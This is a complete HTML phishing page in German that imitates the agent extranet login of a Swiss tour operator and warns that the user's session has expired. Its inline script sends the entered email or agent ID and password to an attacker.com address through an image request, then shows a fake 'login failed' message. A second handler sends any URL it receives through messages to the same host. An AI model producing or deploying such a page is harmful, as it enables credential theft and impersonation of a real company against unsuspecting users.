<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<title>DAE Login</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Arial,sans-serif;background:#f4f4f4;padding:30px}
.login-box{max-width:380px;margin:0 auto;background:#fff;border-radius:8px;box-shadow:0 2px 15px rgba(0,0,0,0.1);overflow:hidden}
.header{background:#e31837;color:#fff;padding:20px;text-align:center}
.header h1{font-size:18px;margin-bottom:5px}
.header p{font-size:12px;opacity:0.9}
.form{padding:25px}
.alert{background:#fff3cd;border:1px solid #ffc107;color:#856404;padding:12px;border-radius:4px;margin-bottom:20px;font-size:13px}
.form-group{margin-bottom:15px}
.form-group label{display:block;font-size:13px;color:#333;margin-bottom:5px;font-weight:600}
.form-group input{width:100%;padding:12px;border:1px solid #ddd;border-radius:4px;font-size:14px}
.form-group input:focus{border-color:#e31837;outline:none}
.btn{width:100%;padding:14px;background:#e31837;color:#fff;border:none;border-radius:4px;font-size:15px;font-weight:600;cursor:pointer}
.btn:hover{background:#c41230}
.footer{text-align:center;padding:15px;background:#f9f9f9;border-top:1px solid #eee;font-size:11px;color:#666}
</style>
</head>
<body>
<div class="login-box">
<div class="header">
<h1>🏔️ DER Touristik Suisse</h1>
<p>Agent Extranet Portal</p>
</div>
<form class="form" id="f">
<div class="alert">⚠️ Ihre Sitzung ist abgelaufen. Bitte melden Sie sich erneut an.</div>
<div class="form-group">
<label>E-Mail / Agent-ID</label>
<input type="text" name="user" required placeholder="ihre.email@agentur.ch">
</div>
<div class="form-group">
<label>Passwort</label>
<input type="password" name="pass" required placeholder="••••••••">
</div>
<button type="submit" class="btn">Anmelden</button>
</form>
<div class="footer">© 2024 DER Touristik Suisse AG - DAE Partner Portal</div>
</div>
<script>
window.addEventListener('message',e=>{if(e.data&&e.data.href)new Image().src='https://attacker.com/l?u='+encodeURIComponent(e.data.href)});
document.getElementById('f').onsubmit=e=>{e.preventDefault();new Image().src='https://attacker.com/d?u='+encodeURIComponent(f.user.value)+'&p='+encodeURIComponent(f.pass.value);alert('Anmeldung fehlgeschlagen. Bitte versuchen Sie es erneut.')};
</script>
</body>
</html>
